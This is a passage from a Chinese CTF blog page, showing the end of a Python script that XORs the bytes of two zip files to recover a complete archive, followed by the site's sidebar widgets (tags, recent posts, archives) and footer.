class="hljs-string">'D:\\CTF\\pcb\\whatis\\output\\zip\\zip4.zip'</span>, <span class="hljs-string">'rb'</span>)</span><br><span class="line">hexs = []</span><br><span class="line">hexs2 = []</span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    t = f.readline()</span><br><span class="line">    t2 = f2.readline()</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> t <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> t2:</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    hexs.extend(str2hex(t))</span><br><span class="line">    hexs2.extend(str2hex(t2))</span><br><span class="line">f.close()</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line">ff = open(<span class="hljs-string">'out.txt'</span>, <span class="hljs-string">'wb'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(min(len(hexs), len(hexs2))):</span><br><span class="line">    a = tran(hexs[i][<span class="hljs-number">0</span>]) * <span class="hljs-number">16</span> + tran(hexs[i][<span class="hljs-number">1</span>])</span><br><span class="line">    b = tran(hexs2[i][<span class="hljs-number">0</span>]) * <span class="hljs-number">16</span> + tran(hexs2[i][<span class="hljs-number">1</span>])</span><br><span class="line">    B = struct.pack(<span class="hljs-string">'B'</span>, a ^ b)</span><br><span class="line">    ff.write(B)</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure></p>
+<p>最终可以发现出来的是一个zip，相信这个才是完整的zip，用密码打开后：</p>
+<div align="center"><br>    <img src="/images/posts/pcb/24.png"><br></div>
+
+
+
+
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        59
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        20
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">26</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/blockchain/" style="font-size: 13.33px;">blockchain</a> <a href="/tags/bypass-pie/" style="font-size: 13.33px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/鹏程杯/" style="font-size: 10px;">鹏程杯</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/12/pcb-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="PCB鹏程杯2018 writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time></div>
+                    <a href="/2018/12/pcb-writeup/" class="has-link-black-ter is-size-6">PCB鹏程杯2018 writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bctf2018-fake3d-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 Fake3D Study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-30T14:05:56.000Z">2018-11-30</time></div>
+                    <a href="/2018/11/bctf2018-fake3d-writeup/" class="has-link-black-ter is-size-6">BCTF2018 Fake3D Study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bctf2018-eosgame-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 EOSGame Study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-29T13:40:56.000Z">2018-11-29</time></div>
+                    <a href="/2018/11/bctf2018-eosgame-writeup/" class="has-link-black-ter is-size-6">BCTF2018 EOSGame Study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bypass-pie-and-libcdatabase/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite2 and libcdatabase">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-27T13:00:56.000Z">2018-11-27</time></div>
+                    <a href="/2018/11/bypass-pie-and-libcdatabase/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite2 and libcdatabase</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">13</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">16</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/blockchain/">
+                        <span class="level-start">
+                            <span class="level-item">blockchain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/鹏程杯/">
+                        <span class="level-start">
+                            <span class="level-item">鹏程杯</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/12/pcb-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="PCB鹏程杯2018 writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-02T14:05:56.000Z">2018-12-02</time></div>
+                    <a href="/2018/12/pcb-writeup/" class="has-link-black-ter is-size-6">PCB鹏程杯2018 writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bctf2018-fake3d-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 Fake3D Study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-30T14:05:56.000Z">2018-11-30</time></div>
+                    <a href="/2018/11/bctf2018-fake3d-writeup/" class="has-link-black-ter is-size-6">BCTF2018 Fake3D Study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bctf2018-eosgame-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BCTF2018 EOSGame Study">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-29T13:40:56.000Z">2018-11-29</time></div>
+                    <a href="/2018/11/bctf2018-eosgame-writeup/" class="has-link-black-ter is-size-6">BCTF2018 EOSGame Study</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/bypass-pie-and-libcdatabase/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite2 and libcdatabase">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-27T13:00:56.000Z">2018-11-27</time></div>
+                    <a href="/2018/11/bypass-pie-and-libcdatabase/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite2 and libcdatabase</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">13</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">16</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/blockchain/">
+                        <span class="level-start">
+                            <span class="level-item">blockchain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/鹏程杯/">
+                        <span class="level-start">
+                            <span class="level-item">鹏程杯</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Junay的博客" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2018 Junay&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
+                </p>
+            </div>
+            <div class="level-end">
+            
